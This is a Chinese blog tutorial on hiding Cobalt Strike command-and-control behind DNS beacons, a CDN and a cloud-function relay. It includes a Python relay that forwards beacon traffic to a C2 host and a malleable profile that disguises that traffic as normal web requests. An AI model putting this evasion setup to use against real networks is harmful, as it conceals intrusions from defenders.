@@ -1,0 +1,860 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="kosakd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1.前言话接上篇，上篇写了cs的常见特征隐藏，这次来讲解下，几种木马上线，常见的隐藏方法，其中有代理转发上线，DNS上线，CDN上线，域前置上线，云函数上线。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CobaltStrike上线隐藏">
+<meta property="og:url" content="http://example.com/2021/06/09/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/index.html">
+<meta property="og:site_name" content="Kosakd&#39;s blog">
+<meta property="og:description" content="1.前言话接上篇，上篇写了cs的常见特征隐藏，这次来讲解下，几种木马上线，常见的隐藏方法，其中有代理转发上线，DNS上线，CDN上线，域前置上线，云函数上线。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/sao.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/1.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/2.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/3.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/4.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/5.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/6.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/7.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/8.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/9.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/10.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/11.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/12.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/13.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/14.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/15.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/16.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/17.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/18.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/19.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/20.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/21.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/22.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/23.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/24.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/25.png">
+<meta property="og:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/26.png">
+<meta property="article:published_time" content="2021-06-09T11:14:53.000Z">
+<meta property="article:modified_time" content="2021-08-04T10:33:40.155Z">
+<meta property="article:author" content="kosakd">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="CobaltStrike教程">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/sao.png">
+  
+  
+  
+  <title>CobaltStrike上线隐藏 - Kosakd&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"gF7Poz0cTuckolpWrCfYGvtE-gzGzoHsz","app_key":"5jhRfVVUhhJhosdWxiVM6xbd","server_url":"https://gf7poz0c.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Kosakd&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CobaltStrike上线隐藏"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-06-09 19:14" pubdate>
+          2021年6月9日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          38 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CobaltStrike上线隐藏</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/sao.png" srcset="/img/loading.gif" lazyload alt="sao"></p>
+<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>话接上篇，上篇写了cs的常见特征隐藏，这次来讲解下，几种木马上线，常见的隐藏方法，其中有代理转发上线，DNS上线，CDN上线，域前置上线，云函数上线。</p>
+<span id="more"></span>
+
+<p>其中域前置上线，通过 这种方法需要厂商的支持，早些时候的amazon和google云都支持，后来取消了。随后cloudflare也取消了域前置的支持，目前国内的aliyun是支持的，曾经ali的cdn绑定域名不需要校验，可以随意绑定域名，实现高可信度域名绑定，现在则添加了域名验证， 不太好设置，如果想看，可以到我的博客中查看。</p>
+<p>咱们这次就介绍三种常用的上线方式，DNS、CDN、云函数上线</p>
+<h2 id="2-DNS上线"><a href="#2-DNS上线" class="headerlink" title="2 DNS上线"></a>2 DNS上线</h2><ol>
+<li>一般我们拿到的shell都是，对出网有限制的，一般只能DNS出网，这时候就要用到我们 DNS 协议建立 C2 通信。，一般waf不会分析DNS流量，这一点也是能够隐蔽的特性。</li>
+<li>DNS_TXT隧道传输：控制端发送的对目标的操作命令被加密后通过DNS的TXT记录里，通过DNS隧道传输隐蔽性较强不易被发现，但传输速度非常慢。</li>
+</ol>
+<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ol>
+<li>需要准备一个不需要备案的域名</li>
+<li>国外vps</li>
+</ol>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="域名注册"><a href="#域名注册" class="headerlink" title="域名注册"></a>域名注册</h4><ol>
+<li><p>想白嫖域名可以到<strong>freenom.com</strong>注册一个免费且不用备案的的域名，但是我重来没用成功过。</p>
+</li>
+<li><p>趣域网可以代购国外域名，<strong>quyu.net</strong>购买一个不需要备案的域名</p>
+</li>
+</ol>
+<h4 id="DNS记录配置"><a href="#DNS记录配置" class="headerlink" title="DNS记录配置"></a>DNS记录配置</h4><p>当注册好域名后，我们就要来配置dns了，创建A记录对应IP为VPS的IP，创建NS记录，解析地址为A记录的域名</p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p>设置完成后，pingA记录域名验证是否能够解析</p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<h4 id="CS的Listeners配置"><a href="#CS的Listeners配置" class="headerlink" title="CS的Listeners配置"></a>CS的Listeners配置</h4><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
+<p>上线之后是个小黑屏，使用<code>checkin</code>命令让dns beacon强制回连teamserver，并输入命令 <code>mode dns-txt</code>使传输的数据更多一些。</p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
+<h2 id="3-CDN上线"><a href="#3-CDN上线" class="headerlink" title="3 CDN上线"></a>3 CDN上线</h2><p>CDN的IP是多个域名共用的，为了做到精确判断，CDN会解析我们的<strong>host</strong>头，根据这样的方式进行判断通信域名，这样我们设置上线IP设置为CDN服务器的IP，<strong>host</strong>设置为我们的DNS，达到隐藏IP的需求</p>
+<h4 id="前期准备-1"><a href="#前期准备-1" class="headerlink" title="前期准备"></a>前期准备</h4><ol>
+<li>CDN服务器，可以选择CloudFlare，amazon，google，tencent，aliyun，都可</li>
+<li>免备案域名，参考上一节</li>
+<li>国外vps服务器，可以选择Vultr之类的，实在没用就用国内的也行</li>
+</ol>
+<h4 id="正文-1"><a href="#正文-1" class="headerlink" title="正文"></a>正文</h4><h5 id="CDN服务器注册"><a href="#CDN服务器注册" class="headerlink" title="CDN服务器注册"></a>CDN服务器注册</h5><ol>
+<li>想白嫖的可以去CloudFlare注册申请免费CDN加速</li>
+<li>腾讯云，也可以白嫖6个月的免费CDN加速</li>
+</ol>
+<h5 id="配置CND服务器"><a href="#配置CND服务器" class="headerlink" title="配置CND服务器"></a>配置CND服务器</h5><p>这里我就用，CloudFlare做做测试了，把域名接入到CloudFlare管理，设置默认CDN加速</p>
+<p>接入域名后，并添加个A记录域名，开启CDN加速</p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
+<p>设置完成后解析下，我们的添加的A记录域名</p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/8.png" srcset="/img/loading.gif" lazyload alt="8"></p>
+<h5 id="CS的Listeners配置-1"><a href="#CS的Listeners配置-1" class="headerlink" title="CS的Listeners配置"></a>CS的Listeners配置</h5><p>Cloudflare支持的HTTP端口是： 80,8080,8880,2052,2082,2086,2095</p>
+<p>Cloudflare支持的HTTPs端口是： 443,2053,2083,2087,2096,8443</p>
+<h6 id="CDNhttp上线"><a href="#CDNhttp上线" class="headerlink" title="CDNhttp上线"></a><strong>CDNhttp上线</strong></h6><p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/9.png" srcset="/img/loading.gif" lazyload alt="9"></p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/10.png" srcset="/img/loading.gif" lazyload alt="10"></p>
+<p>成功上线</p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/11.png" srcset="/img/loading.gif" lazyload alt="11"></p>
+<p>抓包流量走的都是CDN的IP</p>
+<h6 id="CDNhttps上线"><a href="#CDNhttps上线" class="headerlink" title="CDNhttps上线"></a><strong>CDNhttps上线</strong></h6><p>CS使用CDN后，可以一定程度隐藏IP地址，使用WireShark抓包交互IP都是CDN地址，但是传输协议使用的HTTP，传输内容是没有加密的，如果要加密，则可以使用HTTPS。</p>
+<p>还以CloudFlare为例，切换到SSL&#x2F;TLS栏，证书类型选择完全，如下图：</p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/12.png" srcset="/img/loading.gif" lazyload alt="12"></p>
+<p>切换到源服务器，创建证书保存<strong>私钥和证书</strong></p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/13.png" srcset="/img/loading.gif" lazyload alt="13"></p>
+<p>将生成的内容分别存储为1.pem和1.key（名字可以随便起），传到CS所在的服务器，然后生成新的store文件，执行下面命令，生成相关的store文件：命令中xxx.xxxx.com替换为自己的域名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl pkcs12 -<span class="hljs-built_in">export</span> -<span class="hljs-keyword">in</span> 1.pem -inkey 1.key -out a.p12 -name xxx.xxxx.com -passout pass:123456<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore https.store -srckeystore a.p12 -srcstoretype PKCS12 -srcstorepass 123456 -<span class="hljs-built_in">alias</span> xxx.xxxx.com<br></code></pre></td></tr></table></figure>
+
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/14.png" srcset="/img/loading.gif" lazyload alt="14"></p>
+<p>最后需要更改cs的配置文件中https-certificate的配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">https-certificate &#123;<br>    <span class="hljs-built_in">set</span> keystore <span class="hljs-string">&quot;https.store&quot;</span>;<br>    <span class="hljs-built_in">set</span> password <span class="hljs-string">&quot;123456&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/15.png" srcset="/img/loading.gif" lazyload alt="15"></p>
+<p>重启teamserver设置Listeners</p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/16.png" srcset="/img/loading.gif" lazyload alt="16"></p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/17.png" srcset="/img/loading.gif" lazyload alt="17"></p>
+<p>抓包查看，流量已经SSL&#x2F;TLS加密，流量的IP是DNS服务器的IP</p>
+<h2 id="4-云函数上线"><a href="#4-云函数上线" class="headerlink" title="4 云函数上线"></a>4 云函数上线</h2><p>云函数还是得益于Serverless架构，或者称为无服务器架构，是最近几年新冒出来的一种架构风格，仅需用户编写和上传核心业务代码，交由平台完成部署、调度、流量分发、弹性伸缩等能力。</p>
+<p>我们就可以利用云函数，配置个流量转发，C2Client访问云函数，云函数将流量转发到咱们的C2服务器，一般云函数服务器都会配置CDN，这样速度还行，还可以达对C2服务器的隐藏。</p>
+<h4 id="前期准备-2"><a href="#前期准备-2" class="headerlink" title="前期准备"></a>前期准备</h4><ol>
+<li>支持云函数的厂商azure，tencent都可</li>
+<li>国外vps服务器，可以选择Vultr之类的，实在没用就用国内的也行</li>
+</ol>
+<h4 id="正文-2"><a href="#正文-2" class="headerlink" title="正文"></a>正文</h4><h5 id="云函数配置"><a href="#云函数配置" class="headerlink" title="云函数配置"></a>云函数配置</h5><p>这里我们用tencent做测试，在控制台中找到云函数，创建给新的云函数服务，选择自定义，python3.6环境</p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/18.png" srcset="/img/loading.gif" lazyload alt="18"></p>
+<p>代码为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf8 -*-</span><br><span class="hljs-keyword">import</span> json,requests,base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main_handler</span>(<span class="hljs-params">event, context</span>):<br>    C2=<span class="hljs-string">&#x27;http://&lt;C2服务器地址&gt;&#x27;</span> <span class="hljs-comment"># 这里可以使用 HTTP、HTTPS~下角标~</span><br>    path=event[<span class="hljs-string">&#x27;path&#x27;</span>]<br>    headers=event[<span class="hljs-string">&#x27;headers&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(event)<br>    <span class="hljs-keyword">if</span> event[<span class="hljs-string">&#x27;httpMethod&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span> :<br>        resp=requests.get(C2+path,headers=headers,verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">else</span>:<br>        resp=requests.post(C2+path,data=event[<span class="hljs-string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="hljs-literal">False</span>)<br>        <span class="hljs-built_in">print</span>(resp.headers)<br>        <span class="hljs-built_in">print</span>(resp.content)<br><br>    response=&#123;<br>        <span class="hljs-string">&quot;isBase64Encoded&quot;</span>: <span class="hljs-literal">True</span>,<br>        <span class="hljs-string">&quot;statusCode&quot;</span>: resp.status_code,<br>        <span class="hljs-string">&quot;headers&quot;</span>: <span class="hljs-built_in">dict</span>(resp.headers),<br>        <span class="hljs-string">&quot;body&quot;</span>: <span class="hljs-built_in">str</span>(base64.b64encode(resp.content))[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>]<br>    &#125;<br>    <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure>
+
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/19.png" srcset="/img/loading.gif" lazyload alt="19"></p>
+<p>配置触发器，选择自定义，触发版本选择LATEST最新，触发方式选择API网关触发，这里的API网关触发，根据文档介绍可知它的机制，即将请求内容以参数形式传递给函数，并将函数的返回作为响应的内容。其它选项默认即可。</p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/20.png" srcset="/img/loading.gif" lazyload alt="20"></p>
+<p>云函数，配置完成后，我们还要配置下API网关</p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/21.png" srcset="/img/loading.gif" lazyload alt="21"></p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/22.png" srcset="/img/loading.gif" lazyload alt="22"></p>
+<p>将路径改为根路径()</p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/23.png" srcset="/img/loading.gif" lazyload alt="23"></p>
+<p>更改完成后，即可发布服务，完成后，可以在api服务的基础信息中看到<strong>公网的默认访问地址</strong>，有80和443两个端口，配置的CS监听地址是http就用80端口，https就用443端口</p>
+<p><img src="/CobaltStrike%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8F/24.png" srcset="/img/loading.gif" lazyload alt="24"></p>
+<h5 id="CS的Listeners配置-2"><a href="#CS的Listeners配置-2" class="headerlink" title="CS的Listeners配置"></a>CS的Listeners配置</h5><p>配置CS Profile，内容这里参考下面示例</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs shell">set sample_name &quot;t&quot;;<br>set sleeptime &quot;3000&quot;;<br>set jitter   &quot;0&quot;;<br>set maxdns   &quot;255&quot;;<br>set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;<br><br>http-get &#123;<br><br>  set uri &quot;/api/x&quot;;<br><br>  client &#123;<br>      header &quot;Accept&quot; &quot;*/*&quot;;<br>      metadata &#123;<br>          base64;<br>          prepend &quot;SESSIONID=&quot;;<br>          header &quot;Cookie&quot;;<br>      &#125;<br>  &#125;<br><br>  server &#123;<br>      header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;<br>      header &quot;content-transfer-encoding&quot; &quot;binary&quot;;<br>      header &quot;Server&quot; &quot;Nodejs&quot;;<br>      output &#123;<br>          base64;<br>          print;<br>      &#125;<br>  &#125;<br>&#125;<br>http-stager &#123;<br>  set uri_x86 &quot;/vue.min.js&quot;;<br>  set uri_x64 &quot;/bootstrap-2.min.js&quot;;<br>&#125;<br>http-post &#123;<br>  set uri &quot;/api/y&quot;;<br>  client &#123;<br>      header &quot;Accept&quot; &quot;*/*&quot;;<br>      id &#123;<br>          base64;<br>          prepend &quot;JSESSION=&quot;;<br>          header &quot;Cookie&quot;;<br>      &#125;<br>      output &#123;<br>          base64;<br>          print;<br>      &#125;<br>  &#125;<br><br>  server &#123;<br>      header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;<br>      header &quot;content-transfer-encoding&quot; &quot;binary&quot;;<br>      header &quot;Connection&quot; &quot;keep-alive&quot;;<br>      output &#123;<br>          base64;<br>          print;<br>      &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
